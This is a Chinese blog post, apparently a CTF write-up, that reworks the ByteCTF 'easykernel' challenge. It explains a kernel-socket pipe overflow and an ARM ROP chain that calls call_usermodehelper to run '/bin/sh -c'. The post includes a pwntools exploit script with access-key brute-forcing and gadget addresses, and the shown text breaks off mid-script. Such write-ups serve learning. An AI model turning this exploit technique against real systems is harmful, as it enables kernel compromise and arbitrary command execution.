@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="bytectf easykernel 复现学长出的题，在比赛中由于没有接触过内核socket和arm指令集，然后再加上ida反汇编出来的代码非常抽象，看不清楚逻辑，所以直到比赛结束都没有找见洞在哪里，菜的离谱🤦‍♀️。只能在赛后复现复现这样子了。 漏洞赛后就向学长要到了源码，看源码的时候发现了一个这个漏洞，可以溢出写，但是管道每次申请到的堆块的偏移不是固定的，所以不好利用，当时没注意到pop的时">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bytectf easykernel 复现">
+<meta property="og:url" content="http://example.com/2022/09/30/bytectf-easykernel-%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="study">
+<meta property="og:description" content="bytectf easykernel 复现学长出的题，在比赛中由于没有接触过内核socket和arm指令集，然后再加上ida反汇编出来的代码非常抽象，看不清楚逻辑，所以直到比赛结束都没有找见洞在哪里，菜的离谱🤦‍♀️。只能在赛后复现复现这样子了。 漏洞赛后就向学长要到了源码，看源码的时候发现了一个这个漏洞，可以溢出写，但是管道每次申请到的堆块的偏移不是固定的，所以不好利用，当时没注意到pop的时">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-09-30T11:47:01.000Z">
+<meta property="article:modified_time" content="2022-09-30T11:48:16.083Z">
+<meta property="article:author" content="rootzhang">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/09/30/bytectf-easykernel-%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>bytectf easykernel 复现 | study</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">study</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/30/bytectf-easykernel-%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="rootzhang">
+      <meta itemprop="description" content="我的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="study">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          bytectf easykernel 复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-09-30 19:47:01 / 修改时间：19:48:16" itemprop="dateCreated datePublished" datetime="2022-09-30T19:47:01+08:00">2022-09-30</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="bytectf-easykernel-复现"><a href="#bytectf-easykernel-复现" class="headerlink" title="bytectf easykernel 复现"></a>bytectf easykernel 复现</h1><p>学长出的题，在比赛中由于没有接触过内核socket和arm指令集，然后再加上ida反汇编出来的代码非常抽象，看不清楚逻辑，所以直到比赛结束都没有找见洞在哪里，菜的离谱🤦‍♀️。只能在赛后复现复现这样子了。</p>
+<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>赛后就向学长要到了源码，看源码的时候发现了一个这个漏洞，可以溢出写，但是管道每次申请到的堆块的偏移不是固定的，所以不好利用，当时没注意到pop的时候不会清除标志位，经过学长提示才注意到，那从这个角度就好利用多了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (len &lt; <span class="number">0x2000</span> &amp;&amp; cnt &amp;&amp; cnt &lt; <span class="number">0x10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            recv(buf, len, csock);</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">block_struct</span> *<span class="title">blk</span> =</span> &amp;bpipe.blks[(bpipe.pos - <span class="number">1</span>) &amp; <span class="number">0x0f</span>];</span><br><span class="line">            <span class="keyword">int</span> left = <span class="number">0x1000</span> - blk-&gt;tail;</span><br><span class="line">            <span class="keyword">if</span> (blk-&gt;can_merge &amp;&amp; left &gt;= len - <span class="number">0x1000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                blk-&gt;tail = <span class="number">0x2000</span> - len;</span><br><span class="line">                <span class="built_in">memcpy</span>(blk-&gt;blk + blk-&gt;tail, buf, left);</span><br><span class="line">                push_bpipe_data(buf + (len - <span class="number">0x1000</span>), <span class="number">0</span>, <span class="number">0x1000</span>, <span class="number">0</span>, PUREDATA_BLK);</span><br><span class="line">                reply(<span class="string">&quot;[+] create pure data success!\n&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;[+] create pure data success!\n&quot;</span>), csock);</span><br><span class="line">                bfree(buf);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>就是利用server的<code>0x20</code>选项来塞满管道，这里面就有<code>can_merge=1</code>的管道了，然后在全部<code>pop</code>出来，再push<code>0x10</code>权限，就可以让<code>0x10</code>的的管道的<code>can_merge=1</code>,然后就可以越界读和越界写了。最后写<code>*callback_func</code>指针来完成rop。</p>
+<p>可是这是内核socket不像一般的内核题可以传一个程序上去，这该如何rop呢，学长的exp给了一个思路，内核中提供了一个<code>call_usermodehelper</code>函数，允许在内核态执行一个用户态的程序，而且参数接口和用户态的exec()系列函数是一样的，第一个参数是程序名，第二个参数是指针数组，存储着执行这个程序的命令行参数。</p>
+<p>所以只要rop能够1控制<code>r0</code>和<code>r1</code>然后让<code>pc=</code>call_usermodehelper就好了。</p>
+<p>值得注意的是我们要rop就得控制sp,让sp指向我们精心布置的堆块上，这其实直接破坏了程序的上下文，当执行完<code>call_usermodehelper</code>再从栈中寻找上下文恢复到原来调用处就会失败，所以rop首先得保存正常的<code>sp</code>地址，然后再栈迁移，最后再恢复<code>sp</code>。</p>
+<p>所以对gadget的寻找还是有点苛刻的，我觉得不是很好找，当按着学长的gadget复现完之后，尝试自己在找见一套gadget,最后成功简化了一些学长的gadget。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>gadget未简化版</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">key=<span class="string">&#x27;&#x27;</span></span><br><span class="line">key_flag=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">        tmp_key=key+<span class="built_in">chr</span>(j)</span><br><span class="line">        tmp_key=tmp_key.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">        <span class="comment"># sh = process([&#x27;./wscat&#x27;, &#x27;--endpoint&#x27;, &#x27;wss://telnet.2022.capturetheflag.fun/ws/&#x27; + CHALLENGE_ID])</span></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">        sh.send(tmp_key)</span><br><span class="line">        m=sh.recv(<span class="number">15</span>)</span><br><span class="line">        <span class="built_in">print</span> m</span><br><span class="line">        <span class="keyword">if</span> m == <span class="string">&#x27;auth success!!!&#x27;</span>:</span><br><span class="line">            key_flag=<span class="number">1</span></span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.recv(<span class="number">16</span>)</span><br><span class="line">        ture_num=u8(sh.recv(<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> ture_num-<span class="number">1</span>==i:</span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.close()</span><br><span class="line">    <span class="keyword">if</span> key_flag ==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span>(<span class="params">opt,<span class="built_in">len</span>=<span class="number">0</span>,context=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello server\n&quot;</span>)</span><br><span class="line">    sh.send(opt)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x30&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]this is puredata\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x10&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]say hello\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt ==<span class="string">&#x27;\x20&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]do opt func\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span>():</span></span><br><span class="line">    sh=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello client\n&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    data=sh.recv()</span><br><span class="line">    sh.close()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_change</span>(<span class="params">payload,<span class="built_in">str</span>,idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> payload[<span class="number">0</span>:idx]+<span class="built_in">str</span>+payload[idx+<span class="built_in">len</span>(<span class="built_in">str</span>):]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop</span>(<span class="params">heap,cmd</span>):</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x2000</span></span><br><span class="line">    stack=<span class="number">0x1000</span></span><br><span class="line">    save_sp=<span class="number">0x1500</span></span><br><span class="line">    agr=<span class="number">0x1700</span></span><br><span class="line">    sl=<span class="number">0x1800</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;/bin/sh\x00&quot;</span>,agr)</span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;-c&quot;</span>,agr+<span class="number">0x10</span>)</span><br><span class="line">    payload=str_change(payload,cmd,agr+<span class="number">0x20</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr),agr+<span class="number">0x100</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x10</span>),agr+<span class="number">0x100</span>+<span class="number">4</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x20</span>),agr+<span class="number">0x100</span>+<span class="number">8</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8051ef90:	ldr	r3, [r0, #400]	; 0x190</span></span><br><span class="line"><span class="string">    0x8051ef94:	ldr	r2, [r3, #124]	; 0x7c</span></span><br><span class="line"><span class="string">    0x8051ef98:	cmp	r2, #0</span></span><br><span class="line"><span class="string">    0x8051ef9c:	beq	0x8051efb0</span></span><br><span class="line"><span class="string">    0x8051efa0:	blx	r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x190</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8049dd4c</span>),<span class="number">0x7c</span>)  <span class="comment">#r2</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8049dd4c &lt;hvc_push+12&gt;    ldr    r2, [r0, #0xec]</span></span><br><span class="line"><span class="string">    0x8049dd50 &lt;hvc_push+16&gt;    ldr    r1, [r0, #0xe4]</span></span><br><span class="line"><span class="string">    0x8049dd54 &lt;hvc_push+20&gt;    ldr    r3, [r3, #4]</span></span><br><span class="line"><span class="string">    0x8049dd58 &lt;hvc_push+24&gt;    ldr    r0, [r0, #0xf0]</span></span><br><span class="line"><span class="string">    0x8049dd5c &lt;hvc_push+28&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x802d4d18</span>),<span class="number">0xec</span>)  <span class="comment">#r2</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0xe4</span>)  <span class="comment">#r1</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0x4</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0xf0</span>)  <span class="comment">#r0</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80694958 &lt;rpcauth_list_flavors+76&gt;     mov    r0, sp</span></span><br><span class="line"><span class="string">    0x8069495c &lt;rpcauth_list_flavors+80&gt;     blx    r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x802d4d18 &lt;nfs_pgio_result+8&gt;     ldr    r3, [r1, #0x3c]</span></span><br><span class="line"><span class="string">    0x802d4d1c &lt;nfs_pgio_result+12&gt;    mov    r5, r0</span></span><br><span class="line"><span class="string">    0x802d4d20 &lt;nfs_pgio_result+16&gt;    ldr    r2, [r1]</span></span><br><span class="line"><span class="string">    0x802d4d24 &lt;nfs_pgio_result+20&gt;    ldr    r3, [r3, #0xc]</span></span><br><span class="line"><span class="string">    0x802d4d28 &lt;nfs_pgio_result+24&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x3c</span>) <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(heap+stack),<span class="number">0</span>)  <span class="comment"># r2</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c03c</span>),<span class="number">0xc</span>) <span class="comment">#r3</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c03c &lt;cpu_suspend_abort+12&gt;         mov    sp, r2</span></span><br><span class="line"><span class="string">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(save_sp+heap),stack)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8017c0f0</span>),stack+<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8017c0f0 &lt;tick_handover_do_timer+76&gt;    str    r0, [r4]</span></span><br><span class="line"><span class="string">    0x8017c0f4 &lt;tick_handover_do_timer+80&gt;    pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">10</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                                pop    &#123;r1, r2, r3&#125;</span></span><br><span class="line"><span class="string">    0x804282e8                                sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                                rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                                pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0</span>),stack+<span class="number">4</span>*<span class="number">11</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0</span>),stack+<span class="number">4</span>*<span class="number">12</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">13</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c020</span>),stack+<span class="number">4</span>*<span class="number">15</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    &#123;r0, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80136dec</span>),stack+<span class="number">4</span>*<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80136dec &lt;module_attr_show+32&gt;          pop    &#123;lr&#125;</span></span><br><span class="line"><span class="string">    0x80136df0 &lt;module_attr_show+36&gt;          bx     r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                          pop    &#123;r1, r2, r3&#125;</span></span><br><span class="line"><span class="string">    0x804282e8                          sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                          rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                          pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c040</span>),stack+<span class="number">4</span>*<span class="number">19</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+save_sp-<span class="number">0x24</span>),stack+<span class="number">4</span>*<span class="number">22</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8022b754</span>),stack+<span class="number">4</span>*<span class="number">23</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8022b754 &lt;dio_complete+120&gt;    ldr    ip, [r4, #0x24]</span></span><br><span class="line"><span class="string">    0x8022b758 &lt;dio_complete+124&gt;    stm    sp, &#123;r7, ip&#125;</span></span><br><span class="line"><span class="string">    0x8022b75c &lt;dio_complete+128&gt;    blx    r1 </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125; &lt;0x8010c040&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+sl),stack+<span class="number">4</span>*<span class="number">30</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span 